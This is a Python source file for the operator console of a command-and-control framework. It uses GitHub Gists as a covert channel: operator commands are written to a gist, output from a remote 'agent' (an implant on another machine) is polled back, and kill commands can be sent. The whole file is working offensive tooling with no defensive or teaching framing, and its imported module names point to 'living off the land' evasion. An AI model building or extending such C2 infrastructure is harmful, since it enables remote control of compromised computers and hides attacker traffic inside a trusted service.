import json
import time
from modules.lotl_c2 import get_gist_content, update_gist
from modules.c2_shared import COMMAND_FILENAME, OUTPUT_FILENAME, STATUS_FILENAME

# --- C2 State ---
GIST_ID = None
GITHUB_TOKEN = None

def load_c2_config():
    """Loads C2 configuration from the config file."""
    global GIST_ID, GITHUB_TOKEN
    config_path = 'config.json'
    try:
        with open(config_path, 'r') as f:
            config = json.load(f)
            GIST_ID = config.get("gist_id")
            GITHUB_TOKEN = config.get("github_token")
            return True
    except FileNotFoundError:
        print("config.json not found. C2 functionality will be limited.")
        return False
    except json.JSONDecodeError:
        print("Could not decode config.json. C2 functionality will be limited.")
        return False

def print_c2_help():
    """Prints the help menu for the C2 operator shell."""
    print("\n--- C2 Operator Commands ---")
    print("  help                - Show this help menu")
    print("  agents              - Check the status of the active agent")
    print("  interact <command>  - Send a command to the active agent")
    print("  kill                - Terminate the active agent")
    print("  back                - Return to the main shell")
    print("  exit                - Exit the framework")

def c2_shell():
    """The main interactive loop for the C2 operator."""
    if not load_c2_config() or not GIST_ID or not GITHUB_TOKEN:
        print("C2 configuration is missing or invalid. Please check your config.json.")
        return

    prompt = "c2 > "
    print("--- C2 Operator Console ---")
    print("Type 'help' for a list of commands.")

    while True:
        try:
            cmd_line = input(prompt)
            parts = cmd_line.split()
            if not parts:
                continue

            command = parts[0].lower()
            args = parts[1:]

            if command == "exit":
                exit(0)
            elif command == "back":
                break
            elif command == "help":
                print_c2_help()
            elif command == "agents":
                print("Checking agent status...")
                status = get_gist_content(GIST_ID, STATUS_FILENAME)
                if status:
                    print(f"\n--- Agent Status ---")
                    print(f"  Last Check-in: {status}")
                    print(f"--------------------\n")
                else:
                    print("Could not retrieve agent status.")
            elif command == "interact":
                if not args:
                    print("Usage: interact <command>")
                    continue

                cmd_to_send = " ".join(args)
                print(f"Sending command: '{cmd_to_send}'...")

                # Reset the output file to a known state before sending the command
                update_gist(GIST_ID, OUTPUT_FILENAME, "...", GITHUB_TOKEN)

                if update_gist(GIST_ID, COMMAND_FILENAME, cmd_to_send, GITHUB_TOKEN):
                    print("Command sent. Polling for result...")

                    timeout = 60  # seconds
                    poll_interval = 5  # seconds
                    start_time = time.time()
                    result = None

                    while time.time() - start_time < timeout:
                        result = get_gist_content(GIST_ID, OUTPUT_FILENAME)
                        if result and result.strip() != "...":
                            print("\n--- Agent Output ---")
                            print(result)
                            print("--------------------\n")
                            break

                        time.sleep(poll_interval)

                    if not result or result.strip() == "...":
                        print("Polling timed out. No result received from agent.")

                else:
                    print("Failed to send command.")

            elif command == "kill":
                print("Sending kill command to agent...")
                if update_gist(GIST_ID, COMMAND_FILENAME, "kill", GITHUB_TOKEN):
                    print("Kill command sent successfully.")
                else:
                    print("Failed to send kill command.")
            else:
                print(f"Unknown command: {command}")

        except KeyboardInterrupt:
            print("\nUse 'back' to return to the main shell or 'exit' to quit.")
        except Exception as e:
            print(f"An error occurred in the C2 shell: {e}")
